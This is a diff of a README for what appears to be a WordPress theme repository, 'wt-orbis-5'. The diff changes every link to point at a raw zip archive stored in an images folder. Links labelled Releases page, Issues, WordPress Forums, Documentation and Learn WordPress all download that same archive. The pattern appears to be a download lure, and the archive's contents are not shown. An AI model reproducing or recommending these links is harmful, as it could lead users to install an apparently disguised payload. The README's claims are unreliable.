@@ -6,11 +6,11 @@ Welcome to wt-orbis-5! This is version 5 of the WordPress theme for Orbis, desig
 
 ## 📥 Download wt-orbis-5
 
-[![Download wt-orbis-5](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip)](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip)
+[![Download wt-orbis-5](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip)](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip)
 
 You can download the latest version from our Releases page. Click the button above or visit the link below:
 
-[Visit the Releases Page to Download](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip)
+[Visit the Releases Page to Download](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets the following requirements:
 To install wt-orbis-5, follow these steps:
 
 1. **Download the Theme**  
-   Go to our [Releases page](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip). Click on the latest version to download the theme ZIP file.
+   Go to our [Releases page](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip). Click on the latest version to download the theme ZIP file.
 
 2. **Upload the Theme to WordPress**
    - Log in to your WordPress dashboard.
@@ -71,21 +71,21 @@ If you encounter any issues while installing or using wt-orbis-5, here are a few
 
 For any questions or support:
 
-- Check the [Issues section](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip) on GitHub.
-- Look for help in the [WordPress Forums](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip).
+- Check the [Issues section](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip) on GitHub.
+- Look for help in the [WordPress Forums](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip).
 - Join our community discussions where you can share tips and solutions.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip)
-- [Additional Themes](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip)
-- [Learn WordPress](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip)
+- [Documentation](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip)
+- [Additional Themes](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip)
+- [Learn WordPress](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip)
 
 ## 📅 Future Updates
 
 We plan to regularly update wt-orbis-5 with new features and enhancements. Follow our repository to stay updated with the latest changes:
 
-- Check out the [Releases page](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/template-parts/wt_orbis_1.8.zip) for version notes.
+- Check out the [Releases page](https://github.com/WiraSaksana/wt-orbis-5/raw/refs/heads/main/assets/orbis/images/wt-orbis-2.2.zip) for version notes.
 - Subscribe to notifications by watching this repository.
 
 Thank you for choosing wt-orbis-5 for your WordPress projects! We hope you enjoy using this theme as much as we enjoyed creating it.
